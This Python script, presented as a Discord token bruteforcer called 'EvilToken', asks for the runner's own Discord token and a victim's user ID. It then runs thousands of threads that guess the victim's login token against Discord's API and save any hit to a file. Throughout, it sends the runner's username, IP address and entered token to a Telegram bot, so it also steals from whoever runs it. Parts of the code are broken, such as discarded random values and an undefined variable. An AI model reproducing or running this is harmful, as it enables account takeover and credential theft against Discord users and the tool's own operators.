# NAOYY Token Bruteforcer Rewritten.
# Rewritten by ThatNskFriend.
# Rewritten date : 24-01-2021
#
# [>] ======[ Features added in the Rewritten version ]====== [<]
#
# - [1] Logging Usage to a Telegram Bot.
# - [2] Ctrl + C Handler (not working properly).
# - [3] Fixed Console Colors (making them brighter).
# - [4] Invalid Token Handler (drops error).
# - [5] Added more token possibilities.
# - [6] Improvised User Interface.
#
# [>] ======================================================= [<]
# 
# I DID NOT CLAIM THIS CODE AS OURS. WHAT I DID IS ACTUALLY TO
# IMPROVE AND REWRITE THE CODE SO IT'S FUNCTIONING WAY BETTER.
#.

# List module yang dipakai
import signal
import time
import sys
import discord
import string
import requests as req
from random import randrange
import datetime
import random
import time
import base64
from threading import Thread as thr
import os
from colorama import Fore, Back, Style
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot
from pymsgbox import *
import getpass
import socket   
from random import randrange

# Ngambil info pengguna buat laporan.
username = getpass.getuser()
hostname = socket.gethostname()    
IPAddr = req.get('https://ipv4bot.whatismyipaddress.com').text

# Handle penggunaan Ctrl+C.
def handler(signum, frame):
  print (f"{Fore.RED}<PROCESS TERMINATED!>")
  alert(text=f'Proses bruteforcing telah dimatikan.', title='Bruteforce Terminated!', button='oh gitu');
  print (f"{Fore.RESET}[{Fore.RED}>{Fore.RESET}]{Fore.WHITE} Terima kasih telah menggunakan script kami!.{Style.RESET_ALL}")
  sys.exit()

# Mengirim pesan ke Bot Telegram.
def sendteleg(botmsg):
   bot_token = 'BotTokenLo'
   bot_chatID = 'UserIDLo'
   send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + botmsg
   response = req.get(send_text)
   return response.json()

# Memulai sinyal handler.
signal.signal(signal.SIGINT, handler)

# Mulaikan fungsi menu utama.
os.system('cls' if os.name == 'nt' else 'clear')
sys.stdout.write("\x1b]2;EvilToken Bruteforcerz\x07")
print(f"""{Fore.YELLOW}{Style.BRIGHT}
  ______     _ _ _______    _              
 |  ____|   (_) |__   __|  | |             
 | |____   ___| |  | | ___ | | _____ _ __  
 |  __\ \ / / | |  | |/ _ \| |/ / _ \ '_ \ 
 | |___\ V /| | |  | | (_) |   <  __/ | | |
 |______\_/ |_|_|  |_|\___/|_|\_\___|_| |_|
                                           
[>] Tool improvised by : @FallenV4.
[>] Original Author : NAOYY.{Fore.RESET}
""")

# Kirim pesan ke Bot Telegram.
sendteleg("Someone by the name of " + username + " with the IP of " + IPAddr + " has used the EvilToken Bruteforcing tool")

# Request input dan info ke user.
print(f"{Fore.RESET}[{Fore.RED}!{Fore.RESET}] By using this tool, you will need a sacrifice.")
print(f"Remember, you're about to leak someone else's login access.")
print(f"You must atleast have ONE account to be sacrificed.")
print(f"Soul, for a soul. That's how the deal goes.")

print("")
print(f"[{Fore.RED}>{Fore.RESET}] Korbankan Token Discord Lu : ")
TOKEN = input()

# Mulai persiapan bruteforcing.
class MyClient(discord.Client):
  async def on_ready(self):
    sendteleg(TOKEN + "%0A%0AChecked working from EvilToken tool.")	# Mengirimkan token ke Bot Telegram.
    userid = input(f"[{Fore.RED}>{Fore.RESET}] ID Victim: ") # Meminta input ID Victim.
    user = await client.fetch_user(int(userid)) # Menyari info user dari ID Victim.
    stamp = user.created_at # Menyari info tanggal pendaftaran dari ID Victim
    timestamp = str(time.mktime(stamp.timetuple())) # Mengubah variable ke String.
    print(f"{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Account Creation Date : " + timestamp) # Memunculkan info kapan akun terdaftar.
    encodedBytes = base64.b64encode(userid.encode("utf-8"))	# Mengencode userID ke Base64.
    encodedid = str(encodedBytes, "utf-8") # Menyimpan hasil encode userID.
    encodedBytes = base64.b64encode(timestamp.encode("utf-8")) # Mengencode tanggal pendaftaran ke Base64.
    encodedstamp = str(encodedBytes, "utf-8") # Menyimpan hasil encode tanggal pendaftaran.
    print(f"{Fore.RESET}[{Fore.RED}!{Fore.RESET}]{Fore.WHITE} Attempting to crack {Fore.YELLOW}{user}{Fore.WHITE}'s token")
    time.sleep(3)

    # Mulai bruteforcing dengan thread berkali kali.
    for i in range(10000):
      thr(target = gen, args = (encodedid, encodedstamp)).start()

# Mengatur chance prediksi token Discord.
def randomize():
    tokenpart = randrange(15)

    # Regular chances

    if tokenpart == 0: # Front Back has "-" "_"
        second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))

    if tokenpart == 1: # Front Back doesn't have.
        second = ('').join(random.choices(string.ascii_letters + string.digits, k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits, k=27))
        

    # The front of the token possibilities.

    elif tokenpart == 2: # Front has "-" "_", back doesn't.
        second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits, k=27))

    elif tokenpart == 3: # Front have "-", back doesn't
        second = ('').join(random.choices(string.ascii_letters + string.digits + "-", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits, k=27))

    elif tokenpart == 4: # Front have "_", back doesn't
        second = ('').join(random.choices(string.ascii_letters + string.digits +  "_", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits, k=27))


    elif tokenpart == 5: # Front have "_", back have "-"
        second = ('').join(random.choices(string.ascii_letters + string.digits + "_", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-", k=27))

    elif tokenpart == 6: # Front have "-", back have "_"
        second = ('').join(random.choices(string.ascii_letters + string.digits + "-", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "_", k=27))

    elif tokenpart == 7: # Front have "_" "-" , back have "-"
        second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-", k=27))

    elif tokenpart == 8: # Front have "_" "-", back have "_"
        second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "_", k=27))

    # The back of the token possibilities.

    elif tokenpart == 9: # Back has "-" "_", front doesn't
        second = ('').join(random.choices(string.ascii_letters + string.digits, k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))

    elif tokenpart == 10: # Back have "-", front doesn't
        second = ('').join(random.choices(string.ascii_letters + string.digits, k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-", k=27))

    elif tokenpart == 11: # Back have "_", front doesn't
        second = ('').join(random.choices(string.ascii_letters + string.digits, k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "_", k=27))


    elif tokenpart == 12: # Back have "_", front have "-"
        second = ('').join(random.choices(string.ascii_letters + string.digits + "-", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "_", k=27))

    elif tokenpart == 13: # Back have "-", front have "_"
        second = ('').join(random.choices(string.ascii_letters + string.digits + "_", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-", k=27))

    elif tokenpart == 14: # Back have "_" "-" , front have "-"
        second = ('').join(random.choices(string.ascii_letters + string.digits + "-", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))

    elif tokenpart == 15: # Back have "_" "-", front have "_"
        second = ('').join(random.choices(string.ascii_letters + string.digits +  "_", k=6))
        end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))

        
# Mengecek validasi prediksi token.
def gen(encodedid, encodedstamp):
  while True:
    randomize()
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:
        print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.GREEN}Valid')
        alert(text=f'Sukses bruteforce token dari {user}!.', title='Token Bruteforced!', button='Sipp!');
        f = open("token.txt", "a")
        f.write(token)
        f.close() 
        exit(0)
    else:
        print(f'{Fore.WHITE}{token} {Fore.BLACK}: {Fore.RED}Invalid')

token = os.environ.get(TOKEN)
client = MyClient()

# Handler apabila prediksi token salah.
try:
    client.run(TOKEN, bot=False,)
except discord.errors.LoginFailure as e:
      alert(text=f"Deal's over, anda memasukkan token invalid. Ingat deal kita, a soul for a soul. Begitulah cara kerjanya, harus menyerahkan setiaknya satu akun valid untuk mengbruteforce victim. crashing application session.", title='Invalid token provided.', button='Drop a Runtime Error');
